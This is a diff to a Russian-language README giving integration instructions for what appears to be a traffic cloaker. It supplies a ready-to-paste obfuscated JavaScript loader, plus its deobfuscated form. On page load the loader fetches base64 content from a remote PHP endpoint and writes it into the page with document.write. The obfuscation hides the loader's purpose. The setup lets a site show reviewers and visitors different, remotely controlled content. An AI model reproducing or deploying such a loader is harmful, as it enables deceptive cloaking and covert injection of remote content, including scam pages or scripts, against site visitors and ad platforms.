@@ -13,16 +13,17 @@
 
 
 Справка по JS-интеграции кло:
+
 Конечный вариант вставить в header конструктора, вместо https://site.ru/ указываете свой домен
 
-<script>
+`<script>
     var script_url = 'https://site.ru/jsprocessing.php';
     var _0x37a0=['responseText','load','addEventListener','write','readystatechange','GET','readyState'];(function(_0x43ef8f,_0x37a067){var _0x5aaf46=function(_0x1484ee){while(--_0x1484ee){_0x43ef8f['push'](_0x43ef8f['shift']());}};_0x5aaf46(++_0x37a067);}(_0x37a0,0x181));var _0x5aaf=function(_0x43ef8f,_0x37a067){_0x43ef8f=_0x43ef8f-0x0;var _0x5aaf46=_0x37a0[_0x43ef8f];return _0x5aaf46;};window[_0x5aaf('0x2')](_0x5aaf('0x1'),function(){var _0xcc31c6=new XMLHttpRequest();_0xcc31c6['open'](_0x5aaf('0x5'),script_url,!![]),_0xcc31c6['addEventListener'](_0x5aaf('0x4'),function(){if(_0xcc31c6[_0x5aaf('0x6')]==0x4&&_0xcc31c6['status']==0xc8){if(_0xcc31c6[_0x5aaf('0x0')]!==''){var _0x16a5a0=atob(_0xcc31c6[_0x5aaf('0x0')]);document[_0x5aaf('0x3')](''+_0x16a5a0+'');}}}),_0xcc31c6['send']();});        
-</script>
+</script>`
 
 Либо вот такой вариант до обфускации
 
-<script>
+`<script>
         var script_url = 'https://safe-shop.shop/jsprocessing.php';
         
 		window.addEventListener("load", function () {
@@ -38,4 +39,4 @@
 			});
 			request.send();
 		});
-</script>
+</script>`
